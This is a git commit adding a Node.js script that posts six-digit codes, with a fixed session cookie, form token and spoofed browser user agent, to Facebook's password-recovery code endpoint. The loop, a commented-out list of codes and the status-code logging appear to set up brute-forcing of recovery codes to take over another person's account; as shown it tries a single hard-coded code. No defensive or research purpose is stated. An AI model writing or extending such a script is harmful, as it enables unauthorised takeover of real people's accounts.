0e11e7c4ded8f4dd8613beec1ea4039bcc35b267
Rochdi Nassah <rochdinassah.1998@gmail.com>
2025-05-22 11:30:16 +0100

    AUTO COMMIT

---
+++ index.js
@@ -0,0 +1,31 @@
+'use strict';
+
+const log = console.log.bind(console);
+const Http2Client = require('./http2-client');
+const helpers = require('./helpers');
+const child_process = require('node:child_process');
+const fs = require('node:fs');
+
+const { rand } = helpers;
+
+const httpClient = new Http2Client(false);
+
+const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';
+
+(async () => {
+  const url = 'https://www.facebook.com/recover/code/?cuid=AYjPF4howRxW5KfMlzxUKBkIu6QB1Ktq8kERKAjtnY6mLDLwAhrxFKsYtBBkiuYLj7ErX-5NeKyasyyljWyT3JH68MRRrRpyw3SXefMqGw1o7fn514XvV3k6TN7-_cEt23AOl67b5Ep0kHH1pnEvW6xbZbkc9W3mw9H5D4gAoEDFmo3o4JKQwillO9mCMM9GkRDf6PoB0oz3dsi-lKuAFyCnP1u8IO78YePW28AEalScHQ';
+  const headers = {
+    'Cookie': 'datr=LS4uaKqjexvPknJhuSVD1BWM',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': USER_AGENT,
+    'Sec-Fetch-Site': 'same-origin'
+  };
+  // const codes = require('./codes');
+
+  // child_process.exec('siren warn');
+
+  for (let i = 0, code; 1 > i; ++i) {
+    code = 896475;
+    httpClient.post(url, headers, 'lsd=AVrCihG3UJY&n='+code).then(res => log(res.statusCode));
+  }
+})();
